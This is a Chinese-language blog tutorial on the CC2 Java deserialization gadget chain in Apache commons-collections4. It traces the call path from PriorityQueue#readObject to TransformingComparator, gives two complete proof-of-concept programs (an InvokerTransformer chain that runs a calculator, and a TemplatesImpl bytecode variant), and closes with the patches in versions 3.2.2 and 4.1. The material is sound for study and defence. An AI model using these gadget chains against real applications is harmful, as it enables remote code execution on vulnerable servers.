---
title: "Java反序列化-CC2"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# java反序列化-CC2

在commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两个分⽀版本：

* commons-collections:commons-collections

* org.apache.commons:commons-collections4

这里要讲的的是commons-collections4，先前学过的经典的CC1，CC3，CC6都仍然是可以使用的，而专门针对commons-collections4的利用链有两条：CC2和CC4，这里要讲的就是CC2

经过前期几条CC链的学习，可以大致理解在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从Serializable#readObject()⽅法到Transformer#transform()⽅法的调⽤链

接下来回到CC2

## PriorityQueue利⽤链

CC2中⽤到的两个关键类是：

* java.util.PriorityQueue

* org.apache.commons.collections4.comparators.TransformingComparator

分析一下可以发现，PriorityQueue类有readObject方法：

![QQ_1761795865264](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761795865264.png)

而TransformingComparator类中的compare方法调用了transform：

![QQ_1761796444031](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761796444031.png)

那么接下来的目标就是将这两个方法串起来，看看调用链：

上面可以看到，PriorityQueue#readObject() 中调⽤了 heapify() ⽅法，而heapify()中调⽤了siftDown() ：

![QQ_1761803095120](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761803095120.png)

siftDown()中调⽤了siftDownUsingComparator()：

![QQ_1761803133618](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761803133618.png)

siftDownUsingComparator() 中调⽤的 comparator.compare() ：

![QQ_1761803154360](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761803154360.png)

于是就连接到上⾯的 TransformingComparator 了

可以简单了解一下这个的作用：

> * java.util.PriorityQueue 是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有⾃⼰的优先级，节点之间按照优先级⼤⼩排序成⼀棵树
>
> * 反序列化时为什么需要调⽤ heapify() ⽅法？为了反序列化后，需要恢复（换⾔之，保证）这个结构的顺序
>
> * 排序是靠将⼤的元素下移实现的。 siftDown() 是将节点下移的函数，⽽ comparator.compare() ⽤来⽐较两个元素⼤⼩
>
> * TransformingComparator 实现了 java.util.Comparator 接⼝，这个接⼝⽤于定义两个对象如何进⾏⽐较。siftDownUsingComparator() 中就使⽤这个接⼝的 compare() ⽅法⽐较树的节点。
>
> 简单来说， java.util.PriorityQueue 在Java中是一个优先队列，队列中每一个元素有自己的优先级。在反序列化这个对象时，为了保证队列顺序，会进行重排序的操作，而排序就涉及到大小比较，进而执行 java.util.Comparator 接口的 compare() 方法

思路有了接下来编写POC

## 构造

调用transform后的调用逻辑基本不变，先创建transformer：
~~~java
Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
};
Transformer transformerChain = new ChainedTransformer(fakeTransformers);
~~~

然后创建一个TransformingComparator，传入我们的transformer：

~~~java
Comparator comparator = new TransformingComparator(transformerChain);
~~~

接下来要创建PriorityQueue（第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较，所以是2；第⼆个参数是⽐较时的Comparator，传⼊前⾯实例化的comparator），并传入两个非null的元素：

~~~java
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(2);
~~~

最后反射修改transformechain为恶意的transformer

~~~java
Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain,transformers);
~~~

然后就是序列化和反序列化了，最终的完整代码如下：

~~~java
package com.yuy0ung;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2 {
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        serialize(queue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

运行后成功命令执行：

![QQ_1761804628361](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761804628361.png)

## TemplatesImpl改进

我们在CC3学到可以使用TemplatesImpl来实现更自由的RCE，并且poc中⽆Transformer数组，这个CC2调用链仍然可以沿用这个思路，需要注意的是，此时初始化变量需要传给transform(key)的key中，所以PriorityQueue的对象中就不能随便传元素了：

~~~java
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(obj);
queue.add(obj);
~~~

完整代码如下：

~~~java
package com.yuy0ung;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.*;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2_TemplatesImpl {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);

        Comparator comparator = new TransformingComparator(transformer);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(tmpl);
        queue.add(tmpl);

        setFieldValue(transformer, "iMethodName", "newTransformer");


        serialize(queue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

成功触发命令执行：

![QQ_1761806380328](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761806380328.png)

## 补充

补充两点：

* 这条利⽤链中的关键类 org.apache.commons.collections4.comparators.TransformingComparator ，在commonscollections4.0以前是版本中是没有实现 Serializable 接⼝的，⽆法在序列化中使⽤，所以CC2链不⽀持在commons-collections 3中使⽤

* 官方在CommonsCollections的两个分支针对反序列化漏洞都做了更新，在3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法`FunctorUtils#checkUnsafeSerialization `，⽤于检测反序列化是否安全。这个检查在常⻅的危险Transformer类（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出异常；

  在4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，即彻底⽆法序列化和反序列化